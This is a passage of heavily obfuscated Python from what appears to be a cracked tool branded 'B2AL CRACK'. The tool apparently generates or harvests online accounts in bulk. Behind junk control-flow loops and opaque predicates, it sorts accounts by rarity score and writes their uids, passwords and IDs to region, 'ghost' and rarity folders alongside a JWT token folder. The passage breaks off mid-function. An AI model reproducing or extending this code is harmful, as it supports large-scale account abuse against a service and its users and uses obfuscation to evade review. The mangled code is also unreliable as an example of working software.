        if llIIlllIllIlIllll == 7756212:
            lIIllIIlIIIllllIlllIl = ''
            llIIlllIllIlIllll = 2582988
            continue
        if llIIlllIllIlIllll == 8780773:
            IllIIIIllIIllllllllIIIl = f'{getattr(UI, 'FIRE')}  B2AL CRACK  {getattr(UI, 'FIRE')}'
            llIIlllIllIlIllll = 4445759
            continue
        if llIIlllIllIlIllll == 2893800:
            load_license()
            llIIlllIllIlIllll = 7756212
            continue

class IllIIIIIIIIIIIlII:

    def __init__(self):
        llIIIllllIIlllllIII = 6796745
        while True:
            if llIIIllllIIlllllIII == 7176561:
                setattr(self, '_lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                llIIIllllIIlllllIII = 7958084
                continue
            if llIIIllllIIlllllIII == 6596032:
                llIIIllllIIlllllIII = 8345157
                continue
            if llIIIllllIIlllllIII == 4791463:
                setattr(self, '_last_progress', 0)
                break
            if llIIIllllIIlllllIII == 6796745:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][3] == 42:
                    lIIIIllIlIlllIIIII = 7242693
                    while True:
                        if lIIIIllIlIlllIIIII == 4364706:
                            lIIIIllIlIlllIIIII = 4154663
                            continue
                        if lIIIIllIlIlllIIIII == 7242693:
                            IIllllllIlIIIIlIlIIIIIIl = 41776740
                            lIIIIllIlIlllIIIII = 4154663
                            continue
                        if lIIIIllIlIlllIIIII == 4154663:
                            IIIllllIllIIIlIll = (IIllllllIlIIIIlIlIIIIIIl * 5 ^ 10310989) & 65535
                            lIIIIllIlIlllIIIII = 6109878
                            continue
                        if lIIIIllIlIlllIIIII == 1226139:
                            lIIIIllIlIlllIIIII = 6109878
                            continue
                        if lIIIIllIlIlllIIIII == 6109878:
                            IIIlllIIIllIIllIl = [IIIllllIllIIIlIll >> 1 & 255 for lllIllIIIllllIIlll in range(5)]
                            lIIIIllIlIlllIIIII = 1617508
                            continue
                        if lIIIIllIlIlllIIIII == 1617508:
                            lIllllllIIllllIlIIIll = sum(IIIlllIIIllIIllIl) + IIIllllIllIIIlIll % 21 - IIllllllIlIIIIlIlIIIIIIl
                            break
                        if lIIIIllIlIlllIIIII == 5031234:
                            lIIIIllIlIlllIIIII = 1617508
                            continue
                llIIIllllIIlllllIII = 8345157
                continue
            if llIIIllllIIlllllIII == 8345157:
                setattr(self, '_counter', 0)
                llIIIllllIIlllllIII = 7176561
                continue
            if llIIIllllIIlllllIII == 6099001:
                llIIIllllIIlllllIII = 7958084
                continue
            if llIIIllllIIlllllIII == 7958084:
                setattr(self, '_print_lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                llIIIllllIIlllllIII = 4791463
                continue

    def increment_and_get(self):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][22] * 93 + 222 == 9821:
            IlIlllIIIlIIlIllllI = 4777606
            while True:
                if IlIlllIIIlIIlIllllI == 2435497:
                    IlIlllIIIlIIlIllllI = 8787539
                    continue
                if IlIlllIIIlIIlIllllI == 8787539:
                    IIlIIlllllllIIIl = [IIlIlllIIlIIlllIl >> 7 & 255 for llIIlllIIIlllIIllIIlIll in range(4)]
                    IlIlllIIIlIIlIllllI = 4926292
                    continue
                if IlIlllIIIlIIlIllllI == 4926292:
                    IlllIlIIllIllllIII = sum(IIlIIlllllllIIIl) + IIlIlllIIlIIlllIl % 82 - IIlIIIIlIIIIIll
                    break
                if IlIlllIIIlIIlIllllI == 2111721:
                    IIlIlllIIlIIlllIl = (IIlIIIIlIIIIIll * 4 ^ 3046606) & 65535
                    IlIlllIIIlIIlIllllI = 8787539
                    continue
                if IlIlllIIIlIIlIllllI == 8337744:
                    IlIlllIIIlIIlIllllI = 8337744
                    continue
                if IlIlllIIIlIIlIllllI == 4777606:
                    IIlIIIIlIIIIIll = 67175222
                    IlIlllIIIlIIlIllllI = 2111721
                    continue
        with getattr(self, '_lock'):
            self._counter += 1
            return getattr(self, '_counter')

    def print_account(self, account_data, total, score=None, rarity_level=None, show_common=True):
        IIllIIIlIIlIllIIlIlIII = 3359462
        while True:
            if IIllIIIlIIlIllIIlIlIII == 4197041:
                llIlIIlIIllIlIlll = getattr(self, 'increment_and_get')()
                IIllIIIlIIlIllIIlIlIII = 2529230
                continue
            if IIllIIIlIIlIllIIlIlIII == 2529230:
                with getattr(self, '_print_lock'):
                    IllIllllIlIIIllIlIllIIl = 9571128
                    while True:
                        if IllIllllIlIIIllIlIllIIl == 8677657:
                            IllIllllIlIIIllIlIllIIl = 5643414
                            continue
                        if IllIllllIlIIIllIlIllIIl == 5643414:
                            if score is not None:
                                if score >= 20:
                                    IllllIIIllllII = 2143732
                                    while True:
                                        if IllllIIIllllII == 4575141:
                                            IllllIIIllllII = 4575141
                                            continue
                                        if IllllIIIllllII == 2143732:
                                            IllIllIlIIIIllIlIIIIl = getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')
                                            IllllIIIllllII = 5540110
                                            continue
                                        if IllllIIIllllII == 3155916:
                                            IllllllllIIIIlI = f'{getattr(IlIIIIIIlIIlIlll, 'BOLD')}{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}★ LEGENDARY ★{getattr(IlIIIIIIlIIlIlll, 'RST')}'
                                            break
                                        if IllllIIIllllII == 5540110:
                                            lIllIlIllIlIIl = '🔥'
                                            IllllIIIllllII = 3155916
                                            continue
                                        if IllllIIIllllII == 5873018:
                                            IllllIIIllllII = 5873018
                                            continue
                                elif score >= 15:
                                    IIIIIIlIllIllllIlIlI = 4736188
                                    while True:
                                        if IIIIIIlIllIllllIlIlI == 1444571:
                                            IIIIIIlIllIllllIlIlI = 6370450
                                            continue
                                        if IIIIIIlIllIllllIlIlI == 6370450:
                                            IIIIIIlIllIllllIlIlI = 6370450
                                            continue
                                        if IIIIIIlIllIllllIlIlI == 1849759:
                                            IIIIIIlIllIllllIlIlI = 1444571
                                            continue
                                        if IIIIIIlIllIllllIlIlI == 1401305:
                                            lIllIlIllIlIIl = '👑'
                                            IIIIIIlIllIllllIlIlI = 8951049
                                            continue
                                        if IIIIIIlIllIllllIlIlI == 4736188:
                                            IllIllIlIIIIllIlIIIIl = getattr(IlIIIIIIlIIlIlll, 'ORANGE_GLOW')
                                            IIIIIIlIllIllllIlIlI = 1401305
                                            continue
                                        if IIIIIIlIllIllllIlIlI == 8951049:
                                            IllllllllIIIIlI = f'{getattr(IlIIIIIIlIIlIlll, 'BOLD')}{getattr(IlIIIIIIlIIlIlll, 'ORANGE_GLOW')}◆ MYTHIC ◆{getattr(IlIIIIIIlIIlIlll, 'RST')}'
                                            break
                                elif score >= 11:
                                    IIIllIIIIIllllIllllIlIl = 9889413
                                    while True:
                                        if IIIllIIIIIllllIllllIlIl == 9942614:
                                            IIIllIIIIIllllIllllIlIl = 1769520
                                            continue
                                        if IIIllIIIIIllllIllllIlIl == 1769520:
                                            lIllIlIllIlIIl = '💎'
                                            IIIllIIIIIllllIllllIlIl = 3251980
                                            continue
                                        if IIIllIIIIIllllIllllIlIl == 9889413:
                                            IllIllIlIIIIllIlIIIIl = getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW')
                                            IIIllIIIIIllllIllllIlIl = 1769520
                                            continue
                                        if IIIllIIIIIllllIllllIlIl == 3251980:
                                            IllllllllIIIIlI = f'{getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW')}EPIC{getattr(IlIIIIIIlIIlIlll, 'RST')}'
                                            break
                                elif score >= 7:
                                    lIlIIIIlIlIIIII = 6975693
                                    while True:
                                        if lIlIIIIlIlIIIII == 6975693:
                                            IllIllIlIIIIllIlIIIIl = getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')
                                            lIlIIIIlIlIIIII = 7742117
                                            continue
                                        if lIlIIIIlIlIIIII == 7742117:
                                            lIllIlIllIlIIl = '⭐'
                                            lIlIIIIlIlIIIII = 2391063
                                            continue
                                        if lIlIIIIlIlIIIII == 6092467:
                                            lIlIIIIlIlIIIII = 6975693
                                            continue
                                        if lIlIIIIlIlIIIII == 2391063:
                                            IllllllllIIIIlI = f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}RARE{getattr(IlIIIIIIlIIlIlll, 'RST')}'
                                            break
                                elif score >= 5:
                                    IIlllllIIllIIlIIll = 3262147
                                    while True:
                                        if IIlllllIIllIIlIIll == 1806970:
                                            IIlllllIIllIIlIIll = 1701769
                                            continue
                                        if IIlllllIIllIIlIIll == 5719279:
                                            IIlllllIIllIIlIIll = 5719279
                                            continue
                                        if IIlllllIIllIIlIIll == 3670196:
                                            IllllllllIIIIlI = f'{getattr(IlIIIIIIlIIlIlll, 'SILVER_GLOW')}UNCOMMON{getattr(IlIIIIIIlIIlIlll, 'RST')}'
                                            break
                                        if IIlllllIIllIIlIIll == 3262147:
                                            IllIllIlIIIIllIlIIIIl = getattr(IlIIIIIIlIIlIlll, 'SILVER_GLOW')
                                            IIlllllIIllIIlIIll = 7484730
                                            continue
                                        if IIlllllIIllIIlIIll == 7484730:
                                            lIllIlIllIlIIl = '🔹'
                                            IIlllllIIllIIlIIll = 3670196
                                            continue
                                        if IIlllllIIllIIlIIll == 1701769:
                                            IIlllllIIllIIlIIll = 3262147
                                            continue
                                else:
                                    IlIlllllIlllIlIIllIlI = 8427496
                                    while True:
                                        if IlIlllllIlllIlIIllIlI == 3746283:
                                            lIllIlIllIlIIl = '▪️'
                                            IlIlllllIlllIlIIllIlI = 5248403
                                            continue
                                        if IlIlllllIlllIlIIllIlI == 5248403:
                                            IllllllllIIIIlI = f'{getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}COMMON{getattr(IlIIIIIIlIIlIlll, 'RST')}'
                                            break
                                        if IlIlllllIlllIlIIllIlI == 6958599:
                                            IlIlllllIlllIlIIllIlI = 8427496
                                            continue
                                        if IlIlllllIlllIlIIllIlI == 8427496:
                                            IllIllIlIIIIllIlIIIIl = getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')
                                            IlIlllllIlllIlIIllIlI = 3746283
                                            continue
                            else:
                                lIlllIllllIIIIlIIlIlIlll = 7633055
                                while True:
                                    if lIlllIllllIIIIlIIlIlIlll == 8748248:
                                        lIlllIllllIIIIlIIlIlIlll = 4895603
                                        continue
                                    if lIlllIllllIIIIlIIlIlIlll == 4895603:
                                        lIlllIllllIIIIlIIlIlIlll = 2632900
                                        continue
                                    if lIlllIllllIIIIlIIlIlIlll == 8296326:
                                        lIlllIllllIIIIlIIlIlIlll = 8748248
                                        continue
                                    if lIlllIllllIIIIlIIlIlIlll == 2632900:
                                        lIllIlIllIlIIl = '❓'
                                        lIlllIllllIIIIlIIlIlIlll = 7189476
                                        continue
                                    if lIlllIllllIIIIlIIlIlIlll == 7633055:
                                        IllIllIlIIIIllIlIIIIl = getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')
                                        lIlllIllllIIIIlIIlIlIlll = 2632900
                                        continue
                                    if lIlllIllllIIIIlIIlIlIlll == 7189476:
                                        IllllllllIIIIlI = f'{getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}N/A{getattr(IlIIIIIIlIIlIlll, 'RST')}'
                                        break
                            IllIllllIlIIIllIlIllIIl = 8479136
                            continue
                        if IllIllllIlIIIllIlIllIIl == 5877923:
                            IllIllllIlIIIllIlIllIIl = 9571128
                            continue
                        if IllIllllIlIIIllIlIllIIl == 8479136:
                            print(f'[{llIlIIlIIllIlIlll:4d}/{total}] {lIllIlIllIlIIl} {IllIllIlIIIIllIlIIIIl}ID:{llllllllIlIllIll} | {IllllllllIIIIlI}{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                            break
                        if IllIllllIlIIIllIlIllIIl == 9571128:
                            llllllllIlIllIll = getattr(account_data, 'get')('account_id', 'N/A')
                            IllIllllIlIIIllIlIllIIl = 5643414
                            continue
                break
            if IIllIIIlIIlIllIIlIlIII == 3359462:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][4] == 14:
                    lIIlIIlIIIIIIlIIIllIlI = 7917939
                    while True:
                        if lIIlIIlIIIIIIlIIIllIlI == 9106935:
                            IlIIIlIlIlIlllIlIIII = [IIIllIIIlIlllIll >> 10 & 255 for lIlIIIlIlIlIlIIIIIIlI in range(5)]
                            lIIlIIlIIIIIIlIIIllIlI = 8217111
                            continue
                        if lIIlIIlIIIIIIlIIIllIlI == 7917939:
                            llIllllllIIlllI = 10368120 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][11]
                            lIIlIIlIIIIIIlIIIllIlI = 5061624
                            continue
                        if lIIlIIlIIIIIIlIIIllIlI == 5061624:
                            IIIllIIIlIlllIll = (llIllllllIIlllI * 5 ^ 1155309) & 4294967295
                            lIIlIIlIIIIIIlIIIllIlI = 9106935
                            continue
                        if lIIlIIlIIIIIIlIIIllIlI == 2602600:
                            lIIlIIlIIIIIIlIIIllIlI = 5593578
                            continue
                        if lIIlIIlIIIIIIlIIIllIlI == 8217111:
                            IIllllIlIIIIlI = sum(IlIIIlIlIlIlllIlIIII) + IIIllIIIlIlllIll % 16 - llIllllllIIlllI
                            break
                        if lIIlIIlIIIIIIlIIIllIlI == 7478228:
                            lIIlIIlIIIIIIlIIIllIlI = 7917939
                            continue
                        if lIIlIIlIIIIIIlIIIllIlI == 5593578:
                            lIIlIIlIIIIIIlIIIllIlI = 5593578
                            continue
                IIllIIIlIIlIllIIlIlIII = 4197041
                continue
            if IIllIIIlIIlIllIIlIlIII == 2745636:
                IIllIIIlIIlIllIIlIlIII = 4197041
                continue
            if IIllIIIlIIlIllIIlIlIII == 2959975:
                IIllIIIlIIlIllIIlIlIII = 2959975
                continue
lIIllIIlIIIIIllllllIII = IllIIIIIIIIIIIlII()
IlIIIlllllIIlllII = False
lIIlIIllllIIlII = 0
IIllllIIIlIlIIlIlIlll = 0
lIIIIIlIlIIIIlIlIIlIlI = 0
lIIIllIlIIllllIIIlIIllI = 0
lIlllIllIlllIIIl = 0
normal = 0
lIIllIIIIIIlIIIIII = 4
lIlIllIlIIIIlIll = 0
lIlllIlIlIIIlIl = getattr(IlIlIllllIlllIIIIll, 'Lock')()
IlllIIlIIlIIllI = getattr(IlIlIllllIlllIIIIll, 'Lock')()
lllllllllllIIlllIlIl = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'dirname')(getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'abspath')(__file__))
lIIIlIIIIIllIlllIlIIl = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lllllllllllIIlllIlIl, 'B2AL CRACK')
lIIIIIlIlllIlIIl = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIlIIIIIllIlllIlIIl, 'TOKENS-JWT')
IlIlIIIIlllIIllIIl = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIlIIIIIllIlllIlIIl, 'ACCOUNTS')
lllIllIIlIlIIIlII = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIlIIIIIllIlllIlIIl, 'RARE ACCOUNTS')
lIIIIlIIllIIIIIIIIll = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIlIIIIIllIlllIlIIl, 'GHOST')
IIIIllIIIIlIllIlll = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIIlIIllIIIIIIIIll, 'ACCOUNTS')
lIlIlIIlIllllIllIl = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIIlIIllIIIIIIIIll, 'RAREACCOUNT')
IIIlIlIlIIlIlIlIlIIIll = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIlIIIIIllIlllIlIIl, 'LEGENDARY ACCOUNTS')
IIIllllllIIIIIIIllIIl = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIlIIIIIllIlllIlIIl, 'MYTHIC ACCOUNTS')
llIlIlIlIlIlllIlllI = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIlIIIIIllIlllIlIIl, 'EPIC ACCOUNTS')
IlIIlIIIIIIIlll = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIlIIIIIllIlllIlIIl, 'EXPORTS')
lIIlIlIIlllIlIIl = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIlIIIIIllIlllIlIIl, 'RECOVERY')
IllllIIIIIIIlllllllllII = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(lIIIlIIIIIllIlllIlIIl, 'BACKUP')
for folder in [lIIIlIIIIIllIlllIlIIl, lIIIIIlIlllIlIIl, IlIlIIIIlllIIllIIl, lllIllIIlIlIIIlII, lIIIIlIIllIIIIIIIIll, IIIIllIIIIlIllIlll, lIlIlIIlIllllIllIl, IIIlIlIlIIlIlIlIlIIIll, IIIllllllIIIIIIIllIIl, llIlIlIlIlIlllIlllI, IlIIlIIIIIIIlll, lIIlIlIIlllIlIIl, IllllIIIIIIIlllllllllII]:
    getattr(IllIlllllIlIIllIlIllI, 'makedirs')(folder, exist_ok=True)

class IllllllllIlIllIlIll:

    def __init__(self):
        lIIIIllIllIlIIl = 2695476
        while True:
            if lIIIIllIllIlIIl == 6653815:
                setattr(self, 'retry_queue', [])
                lIIIIllIllIlIIl = 1261790
                continue
            if lIIIIllIllIlIIl == 1261790:
                setattr(self, 'retry_lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                lIIIIllIllIlIIl = 5278178
                continue
            if lIIIIllIllIlIIl == 8706978:
                setattr(self, 'retry_thread', getattr(IlIlIllllIlllIIIIll, 'Thread')(target=getattr(self, '_process_retry_queue'), daemon=True))
                lIIIIllIllIlIIl = 1223646
                continue
            if lIIIIllIllIlIIl == 2695476:
                lIIIIllIllIlIIl = 5493352
                continue
            if lIIIIllIllIlIIl == 3210117:
                setattr(self, 'save_stats', {'total_saved': 0, 'total_failed': 0, 'total_recovered': 0})
                lIIIIllIllIlIIl = 8706978
                continue
            if lIIIIllIllIlIIl == 8829087:
                lIIIIllIllIlIIl = 6653815
                continue
            if lIIIIllIllIlIIl == 5493352:
                setattr(self, 'save_lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                lIIIIllIllIlIIl = 6653815
                continue
            if lIIIIllIllIlIIl == 1223646:
                getattr(getattr(self, 'retry_thread'), 'start')()
                break
            if lIIIIllIllIlIIl == 5278178:
                setattr(self, 'running', True)
                lIIIIllIllIlIIl = 3210117
                continue

    def _write_fast(self, filename, entry, max_retries=2):
        lIllIlllIIlIIIlllIl = 5784894
        while True:
            if lIllIlllIIlIIIlllIl == 4246219:
                lIllIlllIIlIIIlllIl = 4246219
                continue
            if lIllIlllIIlIIIlllIl == 6390718:
                return False
                break
            if lIllIlllIIlIIIlllIl == 1292997:
                for IllIlIllIlllIlII in range(max_retries):
                    try:
                        lIIlllIIIllIllIIIl = 9080410
                        while True:
                            if lIIlllIIIllIllIIIl == 9080410:
                                with getattr(self, 'save_lock'):
                                    getattr(IllIlllllIlIIllIlIllI, 'makedirs')(getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'dirname')(filename), exist_ok=True)
                                    with open(filename, 'a', encoding='utf-8') as f:
                                        getattr(f, 'write')(getattr(json, 'dumps')(entry, separators=(',', ': '), ensure_ascii=False) + '\n')
                                lIIlllIIIllIllIIIl = 9088123
                                continue
                            if lIIlllIIIllIllIIIl == 2607178:
                                return True
                                break
                            if lIIlllIIIllIllIIIl == 4962147:
                                lIIlllIIIllIllIIIl = 4962147
                                continue
                            if lIIlllIIIllIllIIIl == 9088123:
                                with getattr(self, 'save_lock'):
                                    getattr(self, 'save_stats')['total_saved'] += 1
                                lIIlllIIIllIllIIIl = 2607178
                                continue
                    except:
                        if IllIlIllIlllIlII < max_retries - 1:
                            getattr(IlllllIIllIIllIIll, 'sleep')(0.05)
                            continue
                        else:
                            lllIllIIlIIIlIIIl = 3725597
                            while True:
                                if lllIllIIlIIIlIIIl == 4775109:
                                    lllIllIIlIIIlIIIl = 8254893
                                    continue
                                if lllIllIIlIIIlIIIl == 9018280:
                                    lllIllIIlIIIlIIIl = 8254893
                                    continue
                                if lllIllIIlIIIlIIIl == 3725597:
                                    with getattr(self, 'retry_lock'):
                                        getattr(getattr(self, 'retry_queue'), 'append')({'filename': filename, 'entry': entry, 'attempts': 0})
                                    lllIllIIlIIIlIIIl = 1301536
                                    continue
                                if lllIllIIlIIIlIIIl == 8254893:
                                    lllIllIIlIIIlIIIl = 3885480
                                    continue
                                if lllIllIIlIIIlIIIl == 1301536:
                                    with getattr(self, 'save_lock'):
                                        getattr(self, 'save_stats')['total_failed'] += 1
                                    lllIllIIlIIIlIIIl = 3885480
                                    continue
                                if lllIllIIlIIIlIIIl == 3885480:
                                    return False
                                    break
                lIllIlllIIlIIIlllIl = 6390718
                continue
            if lIllIlllIIlIIIlllIl == 5784894:
                lIllIlllIIlIIIlllIl = 1292997
                continue

    def _process_retry_queue(self):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][20] == 215:
            IIlIIIIlIIIllIll = 1659990
            while True:
                if IIlIIIIlIIIllIll == 1294387:
                    IIlIIIIlIIIllIll = 6311704
                    continue
                if IIlIIIIlIIIllIll == 4994877:
                    IIIIllIIlIlIlI = (IllIlIIlIlllIIIl * 9 ^ 14610377) & 65535
                    IIlIIIIlIIIllIll = 6311704
                    continue
                if IIlIIIIlIIIllIll == 6311704:
                    lIIIlllIIIIlIllIII = [IIIIllIIlIlIlI >> 10 & 255 for lIIlIIIllIIlIllII in range(9)]
                    IIlIIIIlIIIllIll = 3697903
                    continue
                if IIlIIIIlIIIllIll == 3697903:
                    IllIIlIIIllIIlIlI = sum(lIIIlllIIIIlIllIII) + IIIIllIIlIlIlI % 18 - IllIlIIlIlllIIIl
                    break
                if IIlIIIIlIIIllIll == 1659990:
                    IllIlIIlIlllIIIl = 17715984 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][17]
                    IIlIIIIlIIIllIll = 4994877
                    continue
        while getattr(self, 'running'):
            getattr(IlllllIIllIIllIIll, 'sleep')(3)
            if not getattr(self, 'retry_queue'):
                continue
            with getattr(self, 'retry_lock'):
                llllIIIllIlllIIIlIIIII = getattr(getattr(self, 'retry_queue'), 'copy')()
                setattr(self, 'retry_queue', [])
            for IIlIlIIIllllIII in llllIIIllIlllIIIlIIIII:
                if not getattr(self, 'running'):
                    break
                IIlIlIIIllllIII['attempts'] += 1
                if getattr(self, '_write_fast')(IIlIlIIIllllIII['filename'], IIlIlIIIllllIII['entry'], max_retries=1):
                    with getattr(self, 'save_lock'):
                        getattr(self, 'save_stats')['total_recovered'] += 1
                elif IIlIlIIIllllIII['attempts'] < 5:
                    with getattr(self, 'retry_lock'):
                        getattr(getattr(self, 'retry_queue'), 'append')(IIlIlIIIllllIII)
                else:
                    getattr(self, '_save_emergency')(IIlIlIIIllllIII['filename'], IIlIlIIIllllIII['entry'])

    def _save_emergency(self, filename, entry):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][19] * 32 + 115 == 3654:
            lIlIllIllIllIIIIlIlIl = 6206423
            while True:
                if lIlIllIllIllIIIIlIlIl == 1795020:
                    lIlIllIllIllIIIIlIlIl = 8022562
                    continue
                if lIlIllIllIllIIIIlIlIl == 6206423:
                    IIIIllIllIIllII = 164506942 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][6]
                    lIlIllIllIllIIIIlIlIl = 8359830
                    continue
                if lIlIllIllIllIIIIlIlIl == 1941983:
                    lIlIllIllIllIIIIlIlIl = 9180246
                    continue
                if lIlIllIllIllIIIIlIlIl == 8359830:
                    lIIIIIIllIllIIllII = (IIIIllIllIIllII * 9 ^ 8108967) & 65535
                    lIlIllIllIllIIIIlIlIl = 9494748
                    continue
                if lIlIllIllIllIIIIlIlIl == 8022562:
                    lIlIllIllIllIIIIlIlIl = 8359830
                    continue
                if lIlIllIllIllIIIIlIlIl == 9180246:
                    lIlIIllIIllIlIl = sum(llIIIIIllllIlIl) + lIIIIIIllIllIIllII % 22 - IIIIllIllIIllII
                    break
                if lIlIllIllIllIIIIlIlIl == 9494748:
                    llIIIIIllllIlIl = [lIIIIIIllIllIIllII >> 6 & 255 for IlllIIIIllllIlIIII in range(9)]
                    lIlIllIllIllIIIIlIlIl = 9180246
                    continue
        try:
            llIIlIlIllllll = getattr(filename, 'replace')('.json', '_emergency.json')
            with open(llIIlIlIllllll, 'a', encoding='utf-8') as f:
                getattr(f, 'write')(getattr(json, 'dumps')(entry, separators=(',', ': '), ensure_ascii=False) + '\n')
        except:
            pass

    def save_normal(self, account_data, region, is_ghost=False):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][21] * 89 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][19] == 15087:
            llIIIIIlIllIIlI = 1749013
            while True:
                if llIIIIIlIllIIlI == 9507169:
                    llIIIIIlIllIIlI = 1749013
                    continue
                if llIIIIIlIllIIlI == 2632363:
                    IlIlIllIlIIIlIlllIl = (IIllIIllIllIIlllllIII * 8 ^ 11248692) & 16777215
                    llIIIIIlIllIIlI = 7829878
                    continue
                if llIIIIIlIllIIlI == 8772511:
                    IlllIIIIIllIlIIIIIIlI = sum(llIIlIIIIIllIIIl) + IlIlIllIlIIIlIlllIl % 55 - IIllIIllIllIIlllllIII
                    break
                if llIIIIIlIllIIlI == 1749013:
                    IIllIIllIllIIlllllIII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][6] * 131382 + 69
                    llIIIIIlIllIIlI = 2632363
                    continue
                if llIIIIIlIllIIlI == 7829878:
                    llIIlIIIIIllIIIl = [IlIlIllIlIIIlIlllIl >> 9 & 255 for lIllIlIlllIIIII in range(8)]
                    llIIIIIlIllIIlI = 8772511
                    continue
        try:
            lllIIllIIIlllIll = 1857489
            while True:
                if lllIIllIIIlllIll == 3645113:
                    return getattr(self, '_write_fast')(filename, entry)
                    break
                if lllIIllIIIlllIll == 7305262:
                    lllIIllIIIlllIll = 6036772
                    continue
                if lllIIllIIIlllIll == 1857489:
                    if is_ghost:
                        filename = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(IIIIllIIIIlIllIlll, 'ghost.json')
                    else:
                        filename = getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'join')(IlIlIIIIlllIIllIIl, f'accounts-{region}.json')
                    lllIIllIIIlllIll = 6036772
                    continue
                if lllIIllIIIlllIll == 6036772:
                    entry = {'uid': account_data['uid'], 'password': account_data['password'], 'account_id': getattr(account_data, 'get')('account_id', 'N/A'), 'name': account_data['name'], 'region': 'GHOST' if is_ghost else region, 'date_created': getattr(getattr(IllIIIIlIIllIIIIIIllll, 'now')(), 'strftime')('%Y-%m-%d %H:%M:%S.%f')[:-3], 'thread_id': getattr(account_data, 'get')('thread_id', 'N/A'), 'saved_at': getattr(IlllllIIllIIllIIll, 'time')()}
                    lllIIllIIIlllIll = 3645113
                    continue
                if lllIIllIIIlllIll == 2102786:
                    lllIIllIIIlllIll = 1857489
                    continue
        except:
            return False

    def save_rare(self, account_data, rarity_level, reason, rscore, is_ghost=False):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][29] ^ 136 == 434:
            lllIlIIIlIllIlllIIlIl = 4081478
            while True:
                if lllIlIIIlIllIlllIIlIl == 8788243:
                    llIllllIlllIlIlIlIllI = (IllllllIlIllIIll * 9 ^ 9418626) & 16777215
                    lllIlIIIlIllIlllIIlIl = 9170680
                    continue
                if lllIlIIIlIllIlllIIlIl == 4840095:
                    lllIlIIIlIllIlllIIlIl = 4840095
                    continue
                if lllIlIIIlIllIlllIIlIl == 9628454:
                    llIlIIlllIIIlIIIlllIllI = sum(lIIIlIIlIllIlI) + llIllllIlllIlIlIlIllI % 18 - IllllllIlIllIIll
                    break
                if lllIlIIIlIllIlllIIlIl == 8311867:
                    lllIlIIIlIllIlllIIlIl = 4081478
                    continue
                if lllIlIIIlIllIlllIIlIl == 4081478:
